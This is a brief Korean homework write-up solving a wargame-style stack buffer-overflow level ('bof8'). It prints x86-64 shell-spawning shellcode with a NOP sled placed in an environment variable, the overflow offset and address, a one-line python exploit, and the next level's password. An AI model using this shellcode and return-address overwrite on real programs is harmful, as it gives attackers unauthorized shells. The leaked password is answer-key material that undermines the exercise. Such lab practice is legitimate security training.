# hw4(bof8)

> bof8
1. 환경변수에 SHELLCODE를 추가해준다.
2. buf~ret까지의 크기를 구하고
3. ret에 환경변수 'SHELLCODE'의 주소값을 overwrite 하는 bof 값 입력

>> 답(bof9.pw): 4191ae56

>> 풀이:

    1. 환경변수 'SHELLCODE' 추가, RET SLED 사용
    export SHELLCODE=`python -c "print '\x90'*20+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'"`

    2. bof8실행 후 아무 값 입력하고 환경변수 SHELLCODE의 주소 확인
    SHELLCODE 주소값: 0x7fffffffeeb5

    b.p.1: vuln의 프롤로그 끝난 후 $rsp - 8, $rbp - 8
    -> buf~sfp 까지의 크기 // buf size = 8, sfp크기 = 8 -> 16bytes

    buf와 sfp에 쓰레기값 + 'SHELLCODE' 환경변수의 주소 입력

    
    (python -c "print 'x'*16+'\xb5\xee\xff\xff\xff\x7f'";cat) | ./bof8